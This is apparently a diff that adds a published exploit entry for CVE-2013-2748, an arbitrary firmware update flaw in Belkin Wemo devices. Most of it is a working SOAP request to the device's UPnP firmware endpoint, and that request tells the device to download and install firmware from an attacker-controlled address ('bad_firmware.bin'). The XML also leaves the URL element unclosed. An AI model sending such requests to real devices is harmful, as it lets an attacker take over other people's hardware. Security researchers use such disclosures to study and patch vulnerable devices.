@@ -1,0 +1,26 @@
+# Exploit Title: Belkin Wemo Arbitrary Firmware Vulnerability
+# Date: 4/3/13
+# Exploit Author: Daniel Buentello
+# Vendor Homepage: http://www.belkin.com/us/wemo
+# Version: Any version prior to WeMo_US_2.00.2176.PVT
+# CVE : CVE-2013-2748
+
+
+POST /upnp/control/firmwareupdate1 HTTP/1.1
+SOAPACTION: "urn:Belkin:service:firmwareupdate:1#UpdateFirmware"
+Content-Length: 
+Content-Type: text/xml; charset="utf-8"
+HOST: 10.0.1.8:49153
+User-Agent: 
+
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+ <s:Body>
+  <u:UpdateFirmware xmlns:u="urn:Belkin:service:firmwareupdate:1">
+   <ReleaseDate>07Jan2013</ReleaseDate><NewFirmwareVersion>1</NewFirmwareVersion><URL>http://10.0.1.99/bad_firmware.bin
+  </u:UpdateFirmware>
+ </s:Body>
+</s:Envelope>
+
+PoC Video:
+https://www.youtube.com/watch?v=BcW2q0aHOFo
